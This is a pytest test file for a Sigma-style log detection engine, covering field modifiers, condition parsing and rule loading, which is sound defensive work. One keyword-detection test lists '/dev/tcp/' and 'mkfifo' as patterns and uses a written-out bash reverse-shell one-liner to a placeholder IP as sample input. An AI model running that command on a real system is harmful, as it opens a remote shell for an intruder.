"""Tests for the Sigma matcher, condition parser and rule loading."""

from __future__ import annotations

import textwrap
import uuid
from pathlib import Path
from typing import Any

import pytest

from sherlog.detection.sigma import (
    RuleError,
    build_ruleset,
    compile_detection,
    compile_field,
    load_rule_file,
    load_rules,
    rule_from_dict,
)


def rec(**kw: Any) -> dict[str, Any]:
    base = {"event_type": "other", "raw": "", "tags": [], "extra": {}}
    base.update(kw)
    return base


# --- field matchers ---------------------------------------------------------------------------


def test_plain_match_is_case_insensitive_with_wildcards() -> None:
    p = compile_field("actor", "ROOT")
    assert p(rec(actor="root")) and not p(rec(actor="rooted"))
    p2 = compile_field("command", "*useradd*")
    assert p2(rec(command="/usr/sbin/useradd bob"))


def test_modifiers() -> None:
    assert compile_field("command|contains", "sudo")(rec(command="do sudo now"))
    assert compile_field("target|startswith", "/tmp/")(rec(target="/tmp/x"))
    assert compile_field("target|endswith", ".php")(rec(target="a.php"))
    assert compile_field("raw|re|i", "FAIL")(rec(raw="failed"))
    assert not compile_field("raw|re", "FAIL")(rec(raw="failed"))


def test_numeric_and_cidr_and_exists() -> None:
    assert compile_field("extra.status|gte", 500)(rec(extra={"status": 503}))
    assert not compile_field("extra.status|gte", 500)(rec(extra={"status": 200}))
    assert compile_field("src_ip|cidr", "10.0.0.0/8")(rec(src_ip="10.1.2.3"))
    assert not compile_field("src_ip|cidr", "10.0.0.0/8")(rec(src_ip="192.168.0.1"))
    assert compile_field("actor|exists", True)(rec(actor="x"))
    assert compile_field("actor|exists", False)(rec(actor=None))


def test_list_value_is_or_unless_all() -> None:
    p = compile_field("event_type", ["user.create", "user.delete"])
    assert p(rec(event_type="user.create")) and not p(rec(event_type="user.modify"))
    p_all = compile_field("tags|contains|all", ["ssh", "invalid_user"])
    assert p_all(rec(tags=["ssh", "invalid_user", "x"]))
    assert not p_all(rec(tags=["ssh"]))


def test_tags_list_field_matches_any_element() -> None:
    assert compile_field("tags|contains", "audit_stopped")(rec(tags=["logging", "audit_stopped"]))


def test_null_match() -> None:
    assert compile_field("actor", None)(rec(actor=None))
    assert not compile_field("actor", None)(rec(actor="root"))


def test_fieldref() -> None:
    p = compile_field("actor|fieldref", "target")
    assert p(rec(actor="root", target="root"))
    assert not p(rec(actor="alice", target="root"))
    assert not p(rec(actor=None, target=None))


def test_extra_field_access_without_prefix() -> None:
    assert compile_field("user_agent|contains", "sqlmap")(rec(extra={"user_agent": "sqlmap/1"}))


# --- selections and conditions ----------------------------------------------------------------


def _detect(det: dict[str, Any]) -> Any:
    return compile_detection(det)


def test_map_is_and_list_is_or() -> None:
    p = _detect(
        {"sel": {"event_type": "auth.login.failure", "tags|contains": "ssh"}, "condition": "sel"}
    )
    assert p(rec(event_type="auth.login.failure", tags=["ssh"]))
    assert not p(rec(event_type="auth.login.failure", tags=["console"]))
    p_or = _detect({"sel": [{"actor": "root"}, {"actor": "admin"}], "condition": "sel"})
    assert p_or(rec(actor="admin")) and not p_or(rec(actor="bob"))


def test_keyword_list_searches_text_fields() -> None:
    p = _detect({"keywords": ["/dev/tcp/", "mkfifo"], "condition": "keywords"})
    assert p(rec(raw="bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))
    assert p(rec(command="mkfifo /tmp/p"))
    assert not p(rec(raw="normal line"))


def test_condition_operators_and_precedence() -> None:
    det = {
        "a": {"actor": "root"},
        "b": {"src_ip": "10.0.0.1"},
        "c": {"event_type": "auth.sudo"},
        "condition": "a and not b or c",
    }
    p = _detect(det)
    assert p(rec(event_type="auth.sudo"))  # c
    assert p(rec(actor="root", src_ip="9.9.9.9"))  # a and not b
    assert not p(rec(actor="root", src_ip="10.0.0.1"))  # a and not b false, c false


def test_condition_of_them_and_wildcard() -> None:
    det = {
        "sel_a": {"actor": "root"},
        "sel_b": {"actor": "admin"},
        "other": {"host": "web01"},
        "condition": "1 of sel_*",
    }
    assert _detect(det)(rec(actor="admin"))
    assert not _detect(det)(rec(actor="bob", host="web01"))
    det["condition"] = "all of sel_*"
    assert not _detect(det)(rec(actor="root"))  # cannot be both
    det2 = {"x": {"actor": "root"}, "y": {"host": "h"}, "condition": "all of them"}
    assert _detect(det2)(rec(actor="root", host="h"))


def test_condition_parens() -> None:
    det = {
        "a": {"actor": "root"},
        "b": {"host": "h"},
        "c": {"src_ip": "1.1.1.1"},
        "condition": "a and (b or c)",
    }
    p = _detect(det)
    assert p(rec(actor="root", src_ip="1.1.1.1"))
    assert not p(rec(actor="root", host="x", src_ip="2.2.2.2"))


@pytest.mark.parametrize(
    "condition",
    ["unknown_sel", "a and", "a b", "1 of nomatch*", "(a", "a or or b"],
)
def test_bad_conditions_raise(condition: str) -> None:
    with pytest.raises(RuleError):
        compile_detection({"a": {"actor": "x"}, "b": {"host": "h"}, "condition": condition})


def test_aggregation_condition_rejected() -> None:
    with pytest.raises(RuleError, match="aggregation"):
        compile_detection({"a": {"actor": "x"}, "condition": "a | count() > 5"})


# --- rule loading -----------------------------------------------------------------------------


def _valid_rule() -> dict[str, Any]:
    return {
        "title": "Test rule",
        "id": str(uuid.uuid4()),
        "logsource": {"product": "linux"},
        "detection": {"sel": {"event_type": "auth.sudo"}, "condition": "sel"},
        "level": "high",
        "tags": ["attack.t1548.003"],
        "x-sherlog": {"recommendation": "do the thing", "confidence": 0.7},
    }


def test_valid_rule_loads() -> None:
    rule = rule_from_dict(_valid_rule())
    assert rule.level.value == "high"
    assert rule.techniques == ("T1548.003",)
    assert rule.recommendation == "do the thing"
    assert not rule.warnings


@pytest.mark.parametrize(
    ("mutate", "match"),
    [
        (lambda d: d.pop("title"), "title"),
        (lambda d: d.update(id="not-a-uuid"), "UUID"),
        (lambda d: d.update(level="apocalyptic"), "level"),
        (lambda d: d.pop("x-sherlog"), "recommendation"),
        (lambda d: d["x-sherlog"].update(confidence=2), "confidence"),
        (lambda d: d.update(detection={"sel": {"a|bogus": 1}, "condition": "sel"}), "modifier"),
        (lambda d: d.update(detection={"condition": "sel"}), "selection"),
        (lambda d: d.pop("detection"), "detection"),
    ],
)
def test_invalid_rules_raise(mutate: Any, match: str) -> None:
    doc = _valid_rule()
    mutate(doc)
    with pytest.raises(RuleError, match=match):
        rule_from_dict(doc)


def test_unknown_technique_warns_not_fails() -> None:
    doc = _valid_rule()
    doc["tags"] = ["attack.t9999"]
    rule = rule_from_dict(doc)
    assert any("T9999" in w for w in rule.warnings)


def test_load_multiple_docs_and_dedup(tmp_path: Path) -> None:
    a, b = _valid_rule(), _valid_rule()
    text = textwrap.dedent(f"""\
        title: {a["title"]}
        id: {a["id"]}
        detection:
          sel:
            event_type: auth.sudo
          condition: sel
        tags: [attack.t1548.003]
        x-sherlog:
          recommendation: r
        ---
        title: {b["title"]}
        id: {b["id"]}
        detection:
          sel:
            event_type: user.create
          condition: sel
        tags: [attack.t1136.001]
        x-sherlog:
          recommendation: r
    """)
    f = tmp_path / "r.yml"
    f.write_text(text)
    rules = load_rule_file(f)
    assert len(rules) == 2
    with pytest.raises(RuleError, match="duplicate"):
        build_ruleset([rules[0], rules[0]])


# --- the bundled rule set ---------------------------------------------------------------------


def test_bundled_rules_all_load_and_validate() -> None:
    ruleset = load_rules()
    assert len(ruleset.base_rules) >= 25
    # No warnings on the shipped rules (every rule has a valid ATT&CK tag).
    for r in ruleset.rules:
        assert not r.warnings, (r.key, r.warnings)
    # Correlations resolve and there are no cycles.
    assert ruleset.correlations
    for r in ruleset.correlations:
        assert r.correlation is not None
        for ref in r.correlation.rules:
            assert ruleset.get(ref) is not None


def test_bundled_ids_are_unique() -> None:
    ruleset = load_rules()
    ids = [r.id for r in ruleset.rules]
    assert len(ids) == len(set(ids))
